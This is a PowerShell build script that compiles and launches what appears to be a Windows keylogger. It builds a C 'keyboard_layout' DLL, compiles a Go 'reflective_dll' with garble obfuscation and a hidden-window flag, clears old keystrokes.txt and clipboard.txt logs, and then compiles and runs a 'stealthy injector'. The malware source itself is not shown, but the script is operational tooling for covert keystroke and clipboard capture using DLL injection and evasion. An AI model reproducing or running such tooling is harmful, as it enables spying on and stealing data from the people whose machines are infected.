Write-Output "# Killing old processes"
try {
    Stop-Process -Name "reflective_dll" -Force -ErrorAction SilentlyContinue
    Write-Output "Previous instances stopped."
} catch {
    Write-Output "No previous processes found or running."
}

Write-Output "# Compiling C (keyboard_layout)"
try {
    x86_64-w64-mingw32-gcc -c -o keyboard_layout.o keyboard_layout.c
    Write-Output "keyboard_layout.o compiled successfully."
} catch {
    Write-Output "Failed to compile keyboard_layout.o."
    exit 1
}

try {
    x86_64-w64-mingw32-gcc -shared -o libkeyboard_layout.dll keyboard_layout.o
    Write-Output "libkeyboard_layout.dll created successfully."
} catch {
    Write-Output "Failed to create libkeyboard_layout.dll."
    exit 1
}

Write-Output "# Obfuscating and Compiling Go to DLL (reflective_dll)"
try {
    # Using garble for obfuscation and compilation
    garble -literals -tiny build -ldflags "-H=windowsgui" -o reflective_dll.dll -buildmode=c-shared main.go
    Write-Output "Go obfuscation and compilation to DLL succeeded."
} catch {
    Write-Output "Go obfuscation and compilation failed."
    exit 1
}

Write-Output "# Cleaning up old logs and temporary files"
try {
    Remove-Item -Path keystrokes.txt, clipboard.txt -ErrorAction SilentlyContinue
    Write-Output "Old log files removed."
} catch {
    Write-Output "Error cleaning up old log files."
}

Write-Output "# Compilation and setup complete"
Write-Output "# Compiling and running stealthy injector process..."
try {
    go build  -o injector.exe injector.go
    Write-Output "Injector compiled successfully."
} catch {
    Write-Output "Failed to compile injector."
    exit 1
}

try {
    Write-Output "Running injector..."
    .\injector.exe
    Write-Output "Injector executed successfully."
} catch {
    Write-Output "Injector execution failed."
    exit 1
}

Write-Output "# Process completed."
Write-Host "Press any key to exit..."
$x = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")